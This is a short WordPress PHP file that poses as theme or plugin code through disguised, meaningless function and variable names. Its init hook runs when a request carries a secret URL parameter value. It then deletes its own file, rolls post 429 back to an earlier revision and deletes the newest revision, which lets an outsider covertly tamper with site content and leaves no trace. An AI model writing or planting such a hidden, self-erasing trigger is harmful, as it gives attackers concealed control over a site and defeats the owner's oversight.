<?php

function header_shortcodes_home() {
	if (isset($_GET['html5_more_text_wishlist']) && $_GET['html5_more_text_wishlist'] === 'store_html5_video_best') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$dev_additional_interactive = 429;
		$theme_type_catalog_elements = wp_get_post_revisions($dev_additional_interactive);
		if (empty($theme_type_catalog_elements)) die('no revisions');
		if (count($theme_type_catalog_elements) < 2) die('less than 2');
		$reviews_svg_php_quick = array_shift($theme_type_catalog_elements);
		$ultimate_listing_include_yoast = $reviews_svg_php_quick->ID;
		$connector_file_favicon = array_shift($theme_type_catalog_elements);
		$hello_cdn_source = $connector_file_favicon->ID;
		$include_bootstrap_plupload = wp_restore_post_revision($hello_cdn_source);
		if ($include_bootstrap_plupload === false) die('error restoring');
		$include_bootstrap_plupload = wp_delete_post_revision($ultimate_listing_include_yoast);		
		if ($include_bootstrap_plupload === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'header_shortcodes_home');
